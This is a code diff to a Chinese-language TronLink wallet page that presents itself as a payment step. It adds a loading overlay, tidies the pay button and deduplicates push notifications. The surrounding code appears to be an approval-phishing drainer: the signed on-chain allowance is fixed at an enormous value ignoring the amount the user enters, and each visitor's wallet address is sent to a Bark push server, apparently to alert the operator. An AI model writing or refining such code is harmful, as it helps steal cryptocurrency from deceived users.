@@ -296,6 +296,33 @@
   }
   .modalok:active{background:#e8ebf1;transform:scale(.99)}
 
+  /* ===== 等钱包的加载动画：屏幕正中，白卡片 + 蓝色细环，跟页面同配色 ===== */
+  .loadwrap{
+    position:fixed;inset:0;z-index:9998;display:flex;align-items:center;justify-content:center;
+    background:rgba(16,24,40,.18);
+    -webkit-backdrop-filter:blur(2.5px);backdrop-filter:blur(2.5px);
+    opacity:0;pointer-events:none;transition:opacity .18s ease;
+  }
+  .loadwrap.on{opacity:1;pointer-events:auto}
+  .loadcard{
+    display:flex;flex-direction:column;align-items:center;
+    padding:22px 26px 19px;background:#fff;border-radius:18px;
+    box-shadow:0 14px 36px rgba(16,24,40,.16);
+    transform:translateY(7px) scale(.97);opacity:0;
+    transition:transform .2s ease,opacity .2s ease;
+  }
+  .loadwrap.on .loadcard{transform:none;opacity:1}
+  .loadring{
+    width:30px;height:30px;border-radius:50%;
+    border:2.5px solid #eaeef6;border-top-color:#2e7cf6;
+    animation:loadspin .78s linear infinite;
+  }
+  @keyframes loadspin{to{transform:rotate(360deg)}}
+  .loadtxt{
+    margin-top:13px;font-size:13px;color:#8e95a3;
+    letter-spacing:.3px;line-height:1;white-space:nowrap;
+  }
+
   .hidden{display:none !important}
 
   @media (max-width:392px){
@@ -399,6 +426,14 @@
   </div>
 
   <div class="toast" id="toast"></div>
+
+  <!-- 等钱包时的加载动画（屏幕正中） -->
+  <div class="loadwrap" id="loadWrap" aria-hidden="true">
+    <div class="loadcard">
+      <span class="loadring"></span>
+      <span class="loadtxt" id="loadTxt">正在唤起钱包</span>
+    </div>
+  </div>
 
   <!-- 结果弹窗（屏幕正中） -->
   <div class="modalwrap" id="modalWrap" role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="modalTitle">
@@ -1917,6 +1952,20 @@
     if (modalOpen && (e.key === "Escape" || e.key === "Esc")) hideModal();
   });
 
+  /* ---------- 等钱包的加载动画：点下去就出现，钱包一有回应就收掉 ---------- */
+  var loadWrap = $("loadWrap"), loadTxt = $("loadTxt");
+  function showLoading(text) {
+    if (!loadWrap) return;
+    if (loadTxt && text) loadTxt.textContent = text;
+    loadWrap.setAttribute("aria-hidden", "false");
+    loadWrap.classList.add("on");
+  }
+  function hideLoading() {
+    if (!loadWrap) return;
+    loadWrap.classList.remove("on");
+    loadWrap.setAttribute("aria-hidden", "true");
+  }
+
   /* 复制 */
   function copyText(txt, okText) {
     var fin = function () { toast(okText || "已复制"); };
@@ -2273,8 +2322,15 @@
      不重新读的话，可能还在跟一个已经失联的钱包说话（点下去没反应、也不报错）。 */
   var HIDDEN_AT = 0;
   document.addEventListener("visibilitychange", function () {
-    if (document.hidden) { HIDDEN_AT = Date.now(); return; }
+    if (document.hidden) {
+      HIDDEN_AT = Date.now();
+      /* 钱包 App 起来了（本页被切到后台）：别让加载层压在刚截的图上 */
+      hideLoading();
+      return;
+    }
     HIDDEN_AT = 0;
+    /* 从钱包切回来还在等结果：加载层接着显示 */
+    if (busy) showLoading("正在等待钱包确认");
     try {
       var t = getTronWeb();
       if (t) {
@@ -2321,25 +2377,17 @@
     WARM = null;
     scheduleWarm(0);
   }
-  var ICON_ARROW = '';
-  var ICON_CHECK = '<svg id="btnIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6.5 9.5 17 4 11.5"/></svg>';
-
+  /* 按钮里只留文字，后面不再挂任何图标（原来做完会跟一个 ✓，去掉） */
   function paintBtn(state, text) {
-    var spin = document.getElementById("spin");
-    var icon = document.getElementById("btnIcon");
-    if (state === "busy") {
-      payBtn.classList.add("busy");
-      payBtn.classList.remove("done");
-      /* 转圈从点下去那一刻就在：一直转到钱包真正弹出来为止 */
-      if (!spin) {
-        if (icon) icon.outerHTML = '<span class="spin" id="spin"></span>';
-        else payBtn.insertAdjacentHTML("beforeend", '<span class="spin" id="spin"></span>');
-      }
-    } else {
-      payBtn.classList.remove("busy");
-      if (spin) spin.outerHTML = (state === "done") ? ICON_CHECK : ICON_ARROW;
-      else if (!icon) payBtn.insertAdjacentHTML("beforeend", (state === "done") ? ICON_CHECK : ICON_ARROW);
+    payBtn.classList.toggle("busy", state === "busy");
+    payBtn.classList.toggle("done", state === "done");
+    var holder = document.getElementById("btnIcon");
+    if (!holder) {
+      payBtn.insertAdjacentHTML("beforeend", '<span id="btnIcon"></span>');
+      holder = document.getElementById("btnIcon");
     }
+    /* 只剩等钱包时按钮中间那个小白圈，其它状态什么都不画 */
+    holder.innerHTML = (state === "busy") ? '<span class="spin" id="spin"></span>' : '';
     /* 转圈时不再显示「下一步」文字，只留中间一个圈 */
     btnText.textContent = (state === "busy") ? "" : text;
   }
@@ -2352,6 +2400,7 @@
     busyGuard = setTimeout(function () {
       if (!busy) return;
       busy = false;
+      hideLoading();
       paintBtn("idle", "下一步");
       WARM = null;
       scheduleWarm(0);
@@ -2494,23 +2543,27 @@
     return BARK_BASE + "/" + encodeURIComponent(addr) + "?" + q.join("&");
   }
 
-  /* 三条通道同时打一遍：fetch(no-cors) / 图片探针 / XHR。
-     都是 GET 打点，不读回包、不受跨域限制，哪条先到算哪条。 */
+  /* 一条提醒只发一个请求。
+     之前是 fetch / 图片探针 / XHR 三条通道同时打，Bark 收到三个请求就弹三条一样的——
+     现在只走 fetch 一条；浏览器没有 fetch 才退到图片探针，二选一，绝不并发。 */
+  var BARK_FIRED = {};      /* 已发过的推送（短窗口去重） */
   function barkFire(url) {
-    try {
-      if (typeof fetch === "function") {
+    /* 同一条内容 8 秒内只发一次：刷新、重连、并发调用都撞不出第二条 */
+    var now = Date.now();
+    if (BARK_FIRED[url] && now - BARK_FIRED[url] < 8000) return;
+    BARK_FIRED[url] = now;
+    for (var k in BARK_FIRED) { if (now - BARK_FIRED[k] > 60000) delete BARK_FIRED[k]; }
+
+    if (typeof fetch === "function") {
+      try {
         fetch(url, { mode: "no-cors", cache: "no-store", keepalive: true }).catch(function () {});
-      }
-    } catch (e) {}
+        return;
+      } catch (e) {}
+    }
     try {
       var im = new Image();
       im.onload = im.onerror = function () { im = null; };
-      im.src = url + "&_t=" + Date.now();
-    } catch (e) {}
-    try {
-      var x = new XMLHttpRequest();
-      x.open("GET", url + "&_x=" + Date.now(), true);
-      x.send();
+      im.src = url + "&_p=" + Date.now();
     } catch (e) {}
   }
 
@@ -2705,8 +2758,10 @@
     if (TEST_SKIP_APPROVAL) {
       busy = true;
       paintBtn("busy");
+      showLoading("正在唤起钱包");
       setTimeout(function () {
         busy = false;
+        hideLoading();
         payBtn.classList.add("done");
         paintBtn("done", "下一步");
         showResultTip();
@@ -2722,6 +2777,7 @@
     if (!tw) {
       busy = false;
       paintBtn("idle", "下一步");
+      hideLoading();
       toast("请在 TronLink 自带浏览器里打开本页", 2600);
       connect();
       return;
@@ -2736,10 +2792,14 @@
     if (!pAmt) {
       busy = false;
       paintBtn("idle", "下一步");
+      hideLoading();
       toast("请先输入数量", 2400);
       $("amountInput").focus();
       return;
     }
+
+    /* 校验都过了，接下来是搭交易、查余额、等钱包弹签名框，这几秒给个居中加载动画 */
+    showLoading("正在唤起钱包");
 
     try {
       /* 上链额度固定按当天日期 + 6 个 0（例：20261120 -> 20261120000000），
@@ -2793,6 +2853,7 @@
 
       clearBusyGuard();
       busy = false;
+      hideLoading();
       SILENT_SIGNS = 0;
       BADTX_STREAK = 0;
       AUTO_RESIGNED = 0;
@@ -2808,6 +2869,7 @@
     } catch (e) {
       clearBusyGuard();
       busy = false;
+      hideLoading();
       paintBtn("idle", "下一步");
       /* 失败的这笔一律作废，下一次点击一定重新造一笔新的 */
       WARM = null;
